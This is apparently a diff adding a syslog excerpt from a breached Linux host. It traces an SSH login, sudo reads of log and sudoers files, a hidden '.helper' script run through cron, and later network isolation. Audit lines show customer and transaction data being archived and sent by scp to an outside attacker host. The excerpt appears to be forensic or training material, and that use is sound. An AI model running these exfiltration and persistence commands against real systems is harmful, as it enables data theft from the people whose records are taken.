@@ -1,0 +1,24 @@
+================================================================
+HOST: 10.0.1.87 — /var/log/syslog (excerpt, 72h around the breach)
+================================================================
+
+Jun  4 02:07:55 host-87 sshd[1872]: Accepted publickey for o.adegoke from 185.220.101.9
+Jun  4 02:08:02 host-87 systemd-logind[1488]: New session 14 of user o.adegoke
+Jun  4 02:09:14 host-87 sudo: o.adegoke : TTY=pts/3 PWD=/home/o.adegoke USER=root COMMAND=/usr/bin/less /var/log/auth.log
+Jun  4 02:11:02 host-87 sudo: o.adegoke : TTY=pts/3 PWD=/home/o.adegoke USER=root COMMAND=/usr/bin/less /etc/sudoers.d/90-ops
+Jun  4 02:12:50 host-87 sudo: o.adegoke : TTY=pts/3 PWD=/home/o.adegoke USER=root COMMAND=/usr/bin/less /var/log/syslog
+Jun  4 02:13:08 host-87 kernel: [audit] EXECVE chmod /var/lib/mc/.helper
+Jun  4 02:13:11 host-87 kernel: [audit] EXECVE bash /var/lib/mc/.helper
+Jun  4 02:14:00 host-87 cron[2417]: (root) RELOAD (cron)
+Jun  4 02:15:02 host-87 CRON[2455]: (root) CMD (/var/lib/mc/.helper)
+Jun  4 02:18:01 host-87 CRON[2502]: (root) CMD (/var/lib/mc/.helper)
+Jun  4 02:31:55 host-87 kernel: [audit] EXECVE tar czf /tmp/exfil.tgz /tmp/customers.csv /tmp/transactions.csv
+Jun  4 03:01:18 host-87 kernel: [audit] EXECVE scp /tmp/exfil.tgz attacker@185.220.101.9:/dropbox/
+Jun  4 03:04:22 host-87 systemd-logind[1488]: Removed session 14
+Jun  5 03:14:25 host-87 sshd[4188]: Accepted publickey for o.adegoke from 185.220.101.9
+Jun  5 03:16:09 host-87 sudo: o.adegoke : TTY=pts/2 USER=root COMMAND=/usr/bin/less /var/log/auth.log
+Jun  5 03:21:49 host-87 systemd-logind[1488]: Removed session 17
+Jun  6 09:00:47 host-87 sshd[6042]: Accepted publickey for o.adegoke from 102.89.34.17
+Jun  8 04:08:11 host-87 systemd[1]: Stopping sshd.service - OpenBSD Secure Shell server
+Jun  8 04:08:11 host-87 systemd[1]: sshd.service: Deactivated successfully.
+Jun  8 04:08:14 host-87 nft[8801]: input drop policy applied (network isolation)
